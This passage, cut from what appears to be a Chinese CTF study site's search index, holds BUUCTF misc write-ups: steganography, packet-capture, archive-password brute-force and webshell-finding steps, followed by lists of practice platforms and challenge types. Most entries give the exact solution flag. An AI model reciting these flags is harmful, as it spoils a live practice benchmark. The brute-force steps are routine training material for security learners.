\u5206\u949f\n&lt;/div&gt;\n</code></pre>"},{"location":"02RSA/ti_record/","title":"\u4e00\u4e9b\u9898\u7684\u8bb0\u5f55","text":"<p> \u7ea6 0 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p>"},{"location":"MISC/","title":"Index","text":"<p> \u7ea6 0 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/","title":"BUU-misc\u7b2c\u4e00\u9875WP","text":"<p> \u7ea6 1583 \u4e2a\u5b57  35 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p> <p>\u63d0\u793a</p> <p>\u672c\u6587\u7528\u4e8ebuu\u7684misc\u5206\u7c7b\u7b2c\u4e00\u9875\u89e3\u9898\u601d\u8def\u53c2\u8003</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_1","title":"\u5927\u767d","text":"<p>\u770b\u4e0d\u5230\u56fe\uff1f \u662f\u4e0d\u662f\u5c4f\u5e55\u592a\u5c0f\u4e86 </p> <p>\u6ce8\u610f\uff1a\u5f97\u5230\u7684 flag \u8bf7\u5305\u4e0a flag{} \u63d0\u4ea4</p> <p>\u63d0\u793a\u6539\u56fe\u7247\u5206\u8fa8\u7387</p> <p>\u7528010\u628a\u5206\u8fa8\u7387\u6539\u6210512 \u753b\u56fe\u5f3a\u884c\u6253\u5f00</p> <p></p> <p>flag{He1l0_d4_ba1}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_2","title":"\u4e4c\u9547\u5cf0\u4f1a\u79cd\u56fe","text":"<p>010\u6253\u5f00 flag\u5728\u6587\u4ef6\u5c3e</p> <p></p> <p>flag{97314e7864a8f62627b26f3f998c37f1}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_3","title":"\u6587\u4ef6\u4e2d\u7684\u79d8\u5bc6","text":"<p>\u200b   </p> <p></p> <p>\u5728\u6587\u4ef6\u4fe1\u606f\u91cc</p> <p>flag{870c5a72806115cb5439345d8b014396}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#wireshark","title":"wireshark","text":"<p>\u9ed1\u5ba2\u901a\u8fc7wireshark\u6293\u5230\u7ba1\u7406\u5458\u767b\u9646\u7f51\u7ad9\u7684\u4e00\u6bb5\u6d41\u91cf\u5305\uff08\u7ba1\u7406\u5458\u7684\u5bc6\u7801\u5373\u662f\u7b54\u6848) </p> <p>\u6ce8\u610f\uff1a\u5f97\u5230\u7684 flag \u8bf7\u5305\u4e0a flag{} \u63d0\u4ea4</p> <p>\u76f4\u63a5\u641c\u5b57\u7b26\u4e32flag</p> <p></p> <p>flag{ffb7567a1d4f4abdffdb54e022f8facd}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#lsb","title":"LSB","text":"<p>stegslove\u67e5\u770bLSB RGB\u4e09\u4e2a\u76840\u5c42\u662fPNG\u5934</p> <p></p> <p>\u4fdd\u5b58\u4e3aflag.png</p> <p></p> <p>\u662f\u4e00\u4e2a\u4e8c\u7ef4\u7801 \u626b\u7801\u5f97\u5230flag</p> <p>cumtctf{1sb_i4_s0_Ea4y}</p> <p>\u5305\u4e0aflag{1sb_i4_s0_Ea4y}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#rar","title":"rar","text":"<p>\u8fd9\u4e2a\u662f\u4e00\u4e2arar\u6587\u4ef6\uff0c\u91cc\u9762\u597d\u50cf\u9690\u85cf\u7740\u4ec0\u4e48\u79d8\u5bc6\uff0c\u4f46\u662f\u538b\u7f29\u5305\u88ab\u52a0\u5bc6\u4e86\uff0c\u6beb\u65e0\u4fdd\u7559\u7684\u544a\u8bc9\u4f60\uff0crar\u7684\u5bc6\u7801\u662f4\u4f4d\u7eaf\u6570\u5b57\u3002 </p> <p>\u6ce8\u610f\uff1a\u5f97\u5230\u7684 flag \u8bf7\u5305\u4e0a flag{} \u63d0\u4ea4</p> <p>\u7528ARCHPR\u7206\u7834</p> <p></p> <p></p> <p>flag{1773c5da790bd3caff38e3decd180eb7}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#zip","title":"zip\u4f2a\u52a0\u5bc6","text":"<p>\u4e24\u4e2a\u5168\u5c40\u6807\u8bb0\u4f4d\u5168\u662f09 00 \u8fd8\u4ee5\u4e3a\u662f\u6211\u8bb0\u9519\u4e86</p> <p>\u90fd\u6539\u621000\u5c31\u80fd\u89e3\u538b\u4e86</p> <p></p> <p>flag{Adm1N-B2G-kU-SZIP}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#qr","title":"qr","text":"<p>\u4e00\u4e2a\u7b7e\u5230\u9898\uff0c\u626b\u4e8c\u7ef4\u7801\u5c31\u6709flag</p> <p>Flag{878865ce73370a4ce607d21ca01b5e59}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_4","title":"\u88ab\u55c5\u63a2\u7684\u6d41\u91cf","text":"<p>\u67d0\u9ed1\u5ba2\u6f5c\u5165\u5230\u67d0\u516c\u53f8\u5185\u7f51\u901a\u8fc7\u55c5\u63a2\u6293\u53d6\u4e86\u4e00\u6bb5\u6587\u4ef6\u4f20\u8f93\u7684\u6570\u636e\uff0c\u8be5\u6570\u636e\u4e5f\u88ab\u8be5\u516c\u53f8\u622a\u83b7\uff0c\u4f60\u80fd\u5e2e\u8be5\u516c\u53f8\u5206\u6790\u4ed6\u6293\u53d6\u7684\u5230\u5e95\u662f\u4ec0\u4e48\u6587\u4ef6\u7684\u6570\u636e\u5417\uff1f </p> <p>\u6ce8\u610f\uff1a\u5f97\u5230\u7684 flag \u8bf7\u5305\u4e0a flag{} \u63d0\u4ea4</p> <p>wireshark\u6253\u5f00 \u8ddf\u8e2atcp\u6d41</p> <p>\u80fd\u770b\u5230\u4f20\u8f93\u8fc7\u4e00\u4e2aflag.jpg</p> <p>flag\u5728\u56fe\u7247\u5c3e</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_5","title":"\u955c\u5b50\u91cc\u9762\u7684\u4e16\u754c","text":"<p>\u6587\u4ef6\u540d\u662fsteg \u7528zsteg\u8dd1\u4e00\u4e0b</p> <p></p> <p>\u5f97\u5230flag{st3g0_saurus_wr3cks}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#ningen","title":"ningen","text":"<p>\u4eba\u7c7b\u7684\u79d1\u5b66\u65e5\u76ca\u53d1\u5c55\uff0c\u5bf9\u81ea\u7136\u7684\u7814\u7a76\u4f9d\u7136\u65e0\u6cd5\u6ee1\u8db3\uff0c\u4f20\u95fb\u65e5\u672c\u79d1\u5b66\u5bb6\u79cb\u660e\u91cd\u7ec4\u4e86\u57fa\u56e0\u5e8f\u5217\uff0c\u9020\u51fa\u4e86\u540d\u4e3aningen\u7684\u8d85\u81ea\u7136\u751f\u7269\u3002\u67d0\u5929\u7279\u5de5\u5c0f\u660e\u5076\u7136\u622a\u83b7\u4e86\u65e5\u672c\u4e0e\u4fc4\u7f57\u65af\u7684\u79d8\u5bc6\u901a\u4fe1\uff0c\u6587\u4ef6\u5c31\u662f\u4e00\u5f20ningen\u7684\u7279\u5199\uff0c\u5c0f\u660e\u901a\u8fc7\u793e\u5de5\uff0c\u77e5\u9053\u4e86\u79cb\u660e\u7279\u522b\u8ba8\u538c\u4e2d\u56fd\u7684\u516d\u4f4d\u94f6\u884c\u5bc6\u7801\uff0c\u559c\u6b22\u56db\u4f4d\u6570\u3002\u4f60\u80fd\u627e\u51fa\u9ed1\u6697\u79d1\u5b66\u5bb6\u79cb\u660e\u7684\u79d8\u5bc6\u4e48\uff1f </p> <p>\u6ce8\u610f\uff1a\u5f97\u5230\u7684 flag \u8bf7\u5305\u4e0a flag{} \u63d0\u4ea4</p> <p>\u7528binwalk\u89e3\u51fa\u6765\u4e00\u4e2a\u538b\u7f29\u5305 \u5e26\u5bc6\u7801</p> <p>\u56db\u4f4d\u6570\u5b57\u5bc6\u7801\u7206\u7834</p> <p></p> <p>\u89e3\u538b\u5f97\u5230flag</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_6","title":"\u5c0f\u660e\u7684\u4fdd\u9669\u7bb1","text":"<p>\u5c0f\u660e\u6709\u4e00\u4e2a\u4fdd\u9669\u7bb1\uff0c\u91cc\u9762\u73cd\u85cf\u4e86\u5c0f\u660e\u7684\u65e5\u8bb0\u672c\uff0c\u4ed6\u8bb0\u5f55\u4e86\u4ec0\u4e48\u79d8\u5bc6\u5462\uff1f\u3002\u3002\u3002\u544a\u8bc9\u4f60\uff0c\u5176\u5b9e\u4fdd\u9669\u7bb1\u7684\u5bc6\u7801\u56db\u4f4d\u7eaf\u6570\u5b57\u5bc6\u7801\u3002\uff08\u7b54\u6848\u683c\u5f0f\uff1aflag\uff5b\u7b54\u6848\uff5d\uff0c\u53ea\u9700\u63d0\u4ea4\u7b54\u6848\uff09 </p> <p>\u6ce8\u610f\uff1a\u5f97\u5230\u7684 flag \u8bf7\u5305\u4e0a flag{} \u63d0\u4ea4</p> <p>binwalk\u8dd1\u51fa\u6765\u4e00\u4e2arar</p> <p>\u56db\u4f4d\u6570\u5b57\u7206\u7834</p> <p></p> <p>\u5f97\u5230flag</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_7","title":"\u7231\u56e0\u65af\u5766","text":"<p>\u4e00\u4e2ajpg</p> <p>\u7528binwalk\u8dd1\u51fa\u6765\u4e00\u4e2a\u5e26\u5bc6\u7801\u7684zip</p> <p></p> <p>\u6ca1\u6709\u5bc6\u7801\u63d0\u793a</p> <p>\u7528exiftools\u770b\u4e00\u4e0b\u4fe1\u606f</p> <p></p> <p>\u5f97\u5230\u5bc6\u7801</p> <p>\u89e3\u538b\u5f97flag</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#easycap","title":"easycap","text":"<p>\u76f4\u63a5\u8ffd\u8e2atcp\u6d41\u5c31\u80fd\u5f97\u5230flag</p> <p></p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_8","title":"\u9690\u85cf\u7684\u94a5\u5319","text":"<p>\u8def\u98de\u4e00\u884c\u4eba\u5343\u8f9b\u4e07\u82e6\u6765\u5230\u4e86\u4f1f\u5927\u822a\u9053\u7684\u7ec8\u70b9\uff0c\u627e\u5230\u4e86\u4f20\u8bf4\u4e2d\u7684One piece\uff0c\u4f46\u662f\u9700\u8981\u94a5\u5319\u624d\u80fd\u6253\u5f00One Piece\u5927\u95e8\uff0c\u94a5\u5319\u5c31\u9690\u85cf\u5728\u4e0b\u9762\u7684\u56fe\u7247\u4e2d\uff0c\u806a\u660e\u7684\u4f60\u80fd\u5e2e\u8def\u98de\u62ff\u5230\u94a5\u5319\uff0c\u6253\u5f00One Piece\u7684\u5927\u95e8\u5417\uff1f </p> <p>\u6ce8\u610f\uff1a\u5f97\u5230\u7684 flag \u8bf7\u5305\u4e0a flag{} \u63d0\u4ea4</p> <p>\u76f4\u63a5010\u6253\u5f00 \u641cflag</p> <p></p> <p>base64\u89e3\u5bc6</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_9","title":"\u53e6\u5916\u4e00\u4e2a\u4e16\u754c","text":"<p>010\u67e5\u770b\u6587\u4ef6\u5c3e</p> <p></p> <p>\u6709\u4e00\u4e32\u4e8c\u8fdb\u5236\u6570 \u662f8\u7684\u500d\u6570</p> <p>8\u4f4d\u4e00\u7ec4\u8f6cASCII\u7801</p> <p><code>koekj3s</code></p> <p>flag{koekj3s}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#flag","title":"FLAG","text":"<p>png stegslove\u67e5\u770brgb\u7b2c0\u5c42\u6570\u636e</p> <p></p> <p>PK\u5934  \u4fdd\u5b58\u4e3azip</p> <p>\u89e3\u538b\u5f97\u5230\u4e00\u4e2aELF\u6587\u4ef6</p> <p>\u8fd0\u884c\u5f97flag</p> <p></p> <p>\u6ce8\u610f\uff1a\u8bf7\u5c06 hctf \u66ff\u6362\u4e3a flag \u63d0\u4ea4\uff0c\u683c\u5f0f flag{}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_10","title":"\u5047\u5982\u7ed9\u6211\u4e09\u5929\u5149\u660e","text":"<p>\u4e24\u4e2a\u6587\u4ef6 \u4e00\u4e2a\u56fe\u7247\u4e00\u4e2a\u538b\u7f29\u5305 \u538b\u7f29\u5305\u5e26\u5bc6\u7801</p> <p></p> <p>\u76f2\u6587\u89e3\u5bc6 <code>kmdonowg</code>  \u662f\u538b\u7f29\u5305\u5bc6\u7801</p> <p></p> <p>morse</p> <pre><code>-.-./-/..-./.--/.--././../-----/---../--.../...--/..---/..--../..---/...--/-../--../\n</code></pre> <p>\u89e3\u51fa\u6765\u662fctfwpei08732?23dz</p> <p>\u5957\u4e0aflag{} \u5220ctf</p> <p>flag{wpei08732?23dz}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_11","title":"\u795e\u79d8\u9f99\u5377\u98ce","text":"<p>\u795e\u79d8\u9f99\u5377\u98ce\u8f6c\u8f6c\u8f6c\uff0c\u79d1\u5b66\u5bb6\u7528\u56db\u4f4d\u6570\u5b57\u4e3a\u5b83\u547d\u540d\uff0c\u4f46\u662f\u53d1\u73b0\u89e3\u5bc6\u540e\u5c45\u7136\u662f\u4e00\u4e32\u5916\u661f\u4eba\u4ee3\u7801\uff01\uff01\u597d\u53ef\u6015\uff01 </p> <p>\u6ce8\u610f\uff1a\u5f97\u5230\u7684 flag \u8bf7\u5305\u4e0a flag{} \u63d0\u4ea4</p> <p>\u4e00\u4e2arar 4\u4f4d\u6570\u5b57\u7206\u7834</p> <p></p> <p></p> <p>brainfuck\u89e3\u5bc6</p> <p><code>flag{e4bbef8bdf9743f8bf5b727a9f6332a8}</code></p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_12","title":"\u540e\u95e8\u67e5\u6740","text":"<p>\u5c0f\u767d\u7684\u7f51\u7ad9\u88ab\u5c0f\u9ed1\u653b\u51fb\u4e86\uff0c\u5e76\u4e14\u4e0a\u4f20\u4e86Webshell\uff0c\u4f60\u80fd\u5e2e\u5c0f\u767d\u627e\u5230\u8fd9\u4e2a\u540e\u95e8\u4e48\uff1f(Webshell\u4e2d\u7684\u5bc6\u7801(md5)\u5373\u4e3a\u7b54\u6848)\u3002 </p> <p>\u6ce8\u610f\uff1a\u5f97\u5230\u7684 flag \u8bf7\u5305\u4e0a flag{} \u63d0\u4ea4</p> <p>\u65b0\u601d\u8def \u5377\u5b9d\u63d0\u4f9b\u7684</p> <p>\u76f4\u63a5\u62d6\u8fdb\u706b\u7ed2\u626b\u63cf</p> <p></p> <p></p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_13","title":"\u6570\u636e\u5305\u4e2d\u7684\u7ebf\u7d22","text":"<p>\u516c\u5b89\u673a\u5173\u8fd1\u671f\u622a\u83b7\u5230\u67d0\u7f51\u7edc\u72af\u7f6a\u56e2\u4f19\u5728\u7ebf\u4ea4\u6d41\u7684\u6570\u636e\u5305\uff0c\u4f46\u65e0\u6cd5\u5206\u6790\u51fa\u5177\u4f53\u7684\u4ea4\u6d41\u5185\u5bb9\uff0c\u806a\u660e\u7684\u4f60\u80fd\u5e2e\u516c\u5b89\u673a\u5173\u627e\u5230\u7ebf\u7d22\u5417\uff1f </p> <p>\u6ce8\u610f\uff1a\u5f97\u5230\u7684 flag \u8bf7\u5305\u4e0a flag{} \u63d0\u4ea4</p> <p>\u8ddf\u8e2aTCP\u6d41  \u7b2c7\u4e2a</p> <p></p> <p>\u518d\u8ddf\u8e2ahttp\u6d41</p> <p>\u628a\u6570\u636ebase64\u89e3\u5bc6\u540e\u518d\u5b58\u4e3a\u56fe\u7247</p> <p></p> <p>flag{209acebf6324a09671abc31c869de72c}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_14","title":"\u8377\u5170\u5bbd\u5e26\u6570\u636e\u6cc4\u9732","text":"<p>conf.bin</p> <p>\u7528RouterPassView\u6253\u5f00</p> <p>\u641c\u7d22username</p> <p>\u5c31\u662fflag{053700357621}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_15","title":"\u6765\u9996\u6b4c\u5427","text":"<p>\u4e00\u4e2amp3</p> <p>\u770b\u58f0\u9053 morse\u7535\u7801</p> <p>...../-.../-.-./----./..---/...../-..../....-/----./-.-./-.../-----/.----/---../---../..-./...../..---/./-..../.----/--.../-../--.../-----/----./..---/----./.----/----./.----/-.-./</p> <p>5bc925649cb0188f52e617d70929191c</p> <p>\u6362\u6210\u5927\u5199</p> <p>\u89e3\u51fa\u6765flag{5BC925649CB0188F52E617D70929191C}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#webshell","title":"webshell\u540e\u95e8","text":"<p>\u706b\u7ed2\u626b\u4e00\u4e0b</p> <p></p> <p>\u641cpass</p> <p></p> <p>flag{ba8e6c6f35a53933b871480bb9a9545c}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#flag_1","title":"\u9762\u5177\u4e0b\u7684flag","text":"<p>\u4e00\u4e2ajpg</p> <p>\u7528binwalk\u5206\u79bb\u51fa\u6765flag.vmdk</p> <p>\u75287z\u89e3\u538b\u51fa\u6765 </p> <pre><code>7z x flag.vmdk\n</code></pre> <p></p> <p>flag\u5206\u4e3a\u4e24\u90e8\u5206</p> <p>\u7b2c\u4e00\u90e8\u5206\u662fbrainfuck</p> <p>flag{N7F5_AD5</p> <p>\u7b2c\u4e8c\u90e8\u5206\u662fook!</p> <p>_i5_funny!}</p> <p>\u5408\u8d77\u6765flag{N7F5_AD5_i5_funny!}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_16","title":"\u4e5d\u8fde\u73af","text":"<p>binwalk \u5206\u79bb\u51fa\u6765\u4e00\u4e2ajpg\u548c\u4e00\u4e2a\u5e26\u5bc6\u7801\u7684zip</p> <p>\u5bc6\u7801\u5e94\u8be5\u5728\u56fe\u7247\u91cc  \u8bd5\u4e86\u4e00\u5708\u662fsteghide</p> <p></p> <p>\u5206\u7c7b\u51fa\u4e00\u4e2atxt \u91cc\u9762\u662f\u538b\u7f29\u5305\u5bc6\u7801</p> <p>flag{1RTo8w@&amp;4nK@z*XL}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_17","title":"\u88ab\u52ab\u6301\u7684\u795e\u79d8\u793c\u7269","text":"<p>\u67d0\u5929\u5c0f\u660e\u6536\u5230\u4e86\u4e00\u4ef6\u5f88\u7279\u522b\u7684\u793c\u7269\uff0c\u6709\u5947\u602a\u7684\u540e\u7f00\uff0c\u5947\u602a\u7684\u540d\u5b57\u548c\u683c\u5f0f\u3002\u5c0f\u660e\u627e\u5230\u4e86\u77e5\u5fc3\u59d0\u59d0\u5ea6\u5a18\uff0c\u5ea6\u5a18\u597d\u50cf\u77e5\u9053\u8fd9\u662f\u5565\uff0c\u4f46\u662f\u5ea6\u5a18\u4e5f\u4e0d\u77e5\u9053\u91cc\u9762\u662f\u5565\u3002\u3002\u3002\u4f60\u5e2e\u5e2e\u5c0f\u660e\uff1f\u627e\u5230\u5e10\u53f7\u5bc6\u7801\uff0c\u4e32\u5728\u4e00\u8d77\uff0c\u752832\u4f4d\u5c0f\u5199MD5\u54c8\u5e0c\u4e00\u4e0b\u5f97\u5230\u7684\u5c31\u662f\u7b54\u6848\u3002 \u94fe\u63a5: https://pan.baidu.com/s/1pwVVpA5_WWY8Og6dhCcWRw \u63d0\u53d6\u7801: 31vk </p> <p>\u6ce8\u610f\uff1a\u5f97\u5230\u7684 flag \u8bf7\u5305\u4e0a flag{} \u63d0\u4ea4</p> <p>\u6d41\u91cf\u5305 \u67e5\u770btcp\u6d41</p> <p>\u4e00\u773cflag</p> <p></p> <p>adminaadminb</p> <p>\u7528md5\u8f6c\u4e00\u4e0b \u52a0\u4e0aflag{</p> <p>flag{1d240aafe21a86afc11f38a45b541a49}</p>"},{"location":"MISC/BUU-misc%E7%AC%AC%E4%B8%80%E9%A1%B5/#_18","title":"\u5237\u65b0\u8fc7\u7684\u56fe\u7247","text":"<p>\u6d4f\u89c8\u56fe\u7247\u7684\u65f6\u5019\u5237\u65b0\u952e\u6709\u6ca1\u6709\u7528\u5462 </p> <p>\u6ce8\u610f\uff1a\u5f97\u5230\u7684 flag \u8bf7\u5305\u4e0a flag{} \u63d0\u4ea4</p> <p>\u5237\u65b0\u63d0\u793a\u5c31\u662fF5\u9690\u5199</p> <p>\u7528F5-steganography\u89e3\u51fa\u6765 </p> <p></p> <p>\u662f\u4e00\u4e2apk\u5934 \u6539\u6210zip\u89e3\u538b</p> <p>\u6709\u4f2a\u52a0\u5bc6 binwalk\u8dd1\u51fa\u6765flag.txt</p> <p>flag{96efd0a2037d06f34199e921079778ee}</p>"},{"location":"MISC/learn/","title":"\u5982\u4f55\u53bb\u5b66","text":"<p> \u7ea6 226 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"},{"location":"MISC/learn/#_1","title":"\u5237\u9898","text":"<p>Warning</p> <p>\u5237\u9898\u771f\u7684\u5f88\u91cd\u8981</p> <p>\u4e0d\u662f\u53ea\u7ec3\u4e60misc\uff0c\u6bcf\u4e2a\u65b9\u5411\u90fd\u662f\u8981\u5237\u9898\u7684\uff0cPWN\u7684\u8fdb\u5ea6\u53ef\u80fd\u6162\u4e00\u70b9\uff0c\u4f46\u5176\u4ed6\u65b9\u5411\u4e5f\u8981\u901a\u8fc7\u5237\u9898\u6765\u5b66\u4e60\u7684</p> <p>\u8fd9\u4e9b\u5e73\u53f0\uff0c\u90fd\u4f1a\u65f6\u4e0d\u65f6\u7684\u4e3e\u529e\u4e00\u4e9b\u6bd4\u8d5b\uff0c\u53ef\u4ee5\u5173\u6ce8\u53c2\u52a0\u53c2\u52a0</p>"},{"location":"MISC/learn/#_2","title":"\u63a8\u8350\u7684\u7ec3\u4e60\u5e73\u53f0","text":""},{"location":"MISC/learn/#buuctf","title":"BUUCTF","text":"<p>https://buuoj.cn/challenges</p>"},{"location":"MISC/learn/#ctfshow","title":"CTFSHOW","text":"<p>\u57fa\u672c\u4e0a\u90fd\u662f\u539f\u521b\u9898</p> <p>https://ctf.show/</p>"},{"location":"MISC/learn/#_3","title":"\u653b\u9632\u4e16\u754c","text":"<p>https://adworld.xctf.org.cn/challenges/list</p>"},{"location":"MISC/learn/#bugku","title":"Bugku","text":"<p>https://ctf.bugku.com/</p> <p>\u539f\u521b\u9898\u6bd4\u8f83\u591a</p>"},{"location":"MISC/learn/#nssctf","title":"NSSCTF","text":"<p>https://www.ctfer.vip/</p>"},{"location":"MISC/learn/#_4","title":"\u4f8b\u9898","text":"<p>Note</p> <p>\u7ec3\u4e60\u5f88\u91cd\u8981\uff0c\u6240\u4ee5\u6211\u7ed9\u63d0\u4f9b\u4e00\u4e9b\u4f8b\u9898 \u5927\u5bb6\u53ef\u4ee5\u505a\u505a\u589e\u52a0\u5370\u8c61\uff0c\u9898\u578b\u53ef\u4ee5\u53bb\u9898\u578b\u6982\u89c8\u770b \u7cbe\u529b\u6709\u9650\uff0c\u7f3a\u5c11\u7684\u7c7b\u578b\u5efa\u8bae\u53bb\u5e73\u53f0\u5237\u9898</p>"},{"location":"MISC/learn/#png","title":"PNG","text":""},{"location":"MISC/learn/#lsb","title":"LSB","text":"<p>\u70b9\u6211\u4e0b\u8f7d</p> <p>\u70b9\u6211\u4e0b\u8f7d</p>"},{"location":"MISC/learn/#_5","title":"\u4fee\u6539\u9ad8","text":"<p>\u70b9\u6211\u4e0b\u8f7d</p>"},{"location":"MISC/learn/#_6","title":"\u4e24\u5f20\u56fe\u7247\u5f02\u6216","text":"<p>\u653b\u9632\u4e16\u754c What-is-this</p> <p>\u653b\u9632\u4e16\u754c a_good_idea</p>"},{"location":"MISC/learn/#apng","title":"apng","text":"<p>buuctf [GKCTF 2021]\u4f60\u77e5\u9053apng\u5417</p>"},{"location":"MISC/learn/#jpg","title":"JPG","text":""},{"location":"MISC/learn/#_7","title":"\u4fee\u6539\u9ad8","text":"<p>\u70b9\u6211\u4e0b\u8f7d</p>"},{"location":"MISC/learn/#steghide","title":"steghide","text":"<p>\u70b9\u6211\u4e0b\u8f7d</p>"},{"location":"MISC/learn/#slienteye","title":"SlientEYE","text":"<p>\u70b9\u6211\u4e0b\u8f7d</p>"},{"location":"MISC/%E9%A2%98%E5%9E%8B/","title":"\u5e38\u89c1\u7684\u9898\u76ee\u7c7b\u578b","text":"<p> \u7ea6 758 \u4e2a\u5b57  1 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>misc\u9898\u578b\u592a\u591a\u4e86\uff0c\u6bcf\u79cd\u8fd8\u6709\u5f88\u591a\u7684\u8003\u6cd5\uff0c\u5217\u51fa\u6765\u7684\u90fd\u662f\u8f83\u5e38\u89c1\u7684</p> <p>\u5173\u4e8e\u9690\u5199</p> <p>\u9996\u5148\u8981\u6709\u4e2a\u5c1d\u8bd5\u7684\u601d\u8def\uff0c\u6bd4\u5982\u8bf4\u62ff\u5230\u4e00\u4e2a\u6587\u4ef6\u8be5\u600e\u4e48\u505a \u5148\u6839\u636e\u6587\u4ef6\u7684\u7c7b\u578b\u786e\u5b9a\u4e0b\u4e00\u6b65\uff0c\u5982\u679c\u6ca1\u6709\u540e\u7f00\u53ef\u4ee5\u653e\u5230010\u8fa8\u8ba4\u6216\u8005\u5728Linux\u4e0b\u7528file\u547d\u4ee4 \u770b\u4e00\u770b\u6587\u4ef6\u5c5e\u6027\uff0c\u6216\u8005\u770b\u4e00\u770b\u53ef\u8bfb\u5b57\u7b26\u4e32\u91cc\u6709\u4ec0\u4e48 \u7136\u540e\u518d\u5177\u4f53\u95ee\u9898\u5177\u4f53\u5206\u6790</p>"},{"location":"MISC/%E9%A2%98%E5%9E%8B/#_2","title":"\u56fe\u7247\u9690\u5199","text":"<p>Note</p> <p>\u56fe\u7247\u9690\u5199\u7684\u5de5\u5177\u65b9\u6cd5\u5b9e\u5728\u662f\u592a\u591a\u4e86</p> <p>\u5e0c\u671b\u5927\u5bb6\u591a\u591a\u5237\u9898\u591a\u591a\u79ef\u7d2f    \u8fd9\u91cc\u53ea\u5217\u51fa\u6765\u5e38\u89c1\u7684</p>"},{"location":"MISC/%E9%A2%98%E5%9E%8B/#png","title":"PNG","text":"<ul> <li>\u4fee\u6539\u5bbd\u9ad8\uff08\u4e00\u822c\u662f\u9ad8\uff09\uff08\u4e00\u822c\u4f1aCRC\u6821\u9a8c\u62a5\u9519\uff09</li> <li>lsb\uff08\u6700\u4f4e\u6709\u6548\u4f4d\u9690\u5199\uff09\u9690\u5199\u6587\u4ef6\u6216\u6587\u5b57\u6216\u56fe\u7247</li> <li>\u4e24\u5f20\u56fe\u7247\u5f02\u6216</li> <li>cloacked-pixel</li> <li>apng(\u53ef\u4ee5\u8003\u53cc\u56fe\u76f2\u6c34\u5370)</li> </ul>"},{"location":"MISC/%E9%A2%98%E5%9E%8B/#jpg","title":"JPG","text":"<ul> <li>steghide</li> <li>jphide</li> <li>jsteg</li> <li>SlientEye</li> <li>\u4fee\u6539\u5bbd\u9ad8\uff08\u6ca1\u6709CRC\u4e0d\u4f1a\u62a5\u9519\uff09</li> </ul>"},{"location":"MISC/%E9%A2%98%E5%9E%8B/#gif","title":"GIF","text":"<ul> <li>\u52a8\u56fe</li> <li>\u5e27\u95f4\u9694\u65f6\u95f4</li> <li>\u4fee\u6539\u5bbd\u9ad8\uff08\u6ce8\u610f\u6709\u591a\u6bb5\uff0c\u800c\u4e14\u6bcf\u5e27\u90fd\u6709\u4e00\u6bb5\u6570\u636e\uff09</li> </ul>"},{"location":"MISC/%E9%A2%98%E5%9E%8B/#bmp","title":"BMP","text":"<ul> <li>\u7c7b\u4f3c\u4e8epng</li> <li>wbs43open</li> </ul>"},{"location":"MISC/%E9%A2%98%E5%9E%8B/#webp","title":"webp","text":""},{"location":"MISC/%E9%A2%98%E5%9E%8B/#_3","title":"\u76f2\u6c34\u5370","text":"<p>Note</p> <p>\u76f2\u6c34\u5370\u7684\u4e00\u822c\u662f\u8003\u4e24\u5f20\u4e00\u6837\u7684\u56fe\u6bd4\u8f83\u591a</p> <p>\u4e0d\u8fc7\u5982\u679c\u4e00\u5f20\u56fe\u8bd5\u4e86\u4e00\u5806\u5de5\u5177\u90fd\u4e0d\u884c\uff0c\u53ef\u4ee5\u8003\u8651\u4e00\u4e0bWaterMarkH</p> <ul> <li>java\u76f2\u6c34\u5370</li> <li>watermarkH</li> <li>bwm\u53cc\u56fe\u76f2\u6c34\u5370</li> <li>\u5085\u91cc\u53f6\u53d8\u6362\uff08</li> 